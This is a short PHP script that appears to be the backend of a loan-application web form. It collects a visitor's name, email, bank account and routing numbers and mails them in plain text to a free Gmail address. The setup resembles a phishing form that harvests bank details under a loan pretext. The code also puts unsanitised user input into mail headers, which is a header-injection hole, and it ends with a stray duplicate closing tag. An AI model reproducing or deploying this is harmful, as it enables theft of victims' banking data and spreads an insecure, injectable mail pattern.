<?php
$name = $_POST['name'];
$email = $_POST['email'];
$bank_account = $_POST['bank_account'];
$routing_number = $_POST['routing_number'];

$to = 'loaneasy377@gmail.com'; // Update with your email address
$subject = 'New Loan Application from Website';

$body = "
Name: $name\n
Email: $email\n
Bank Account: $bank_account\n
Routing Number: $routing_number\n
";

$headers = "From: $email\r\n";
$headers .= "Reply-To: $email\r\n";

if (mail($to, $subject, $body, $headers)) {
    echo "Thank you for your loan application! We'll get back to you soon.";
} else {
    echo "Error sending email. Please try again.";
}
?>
?>
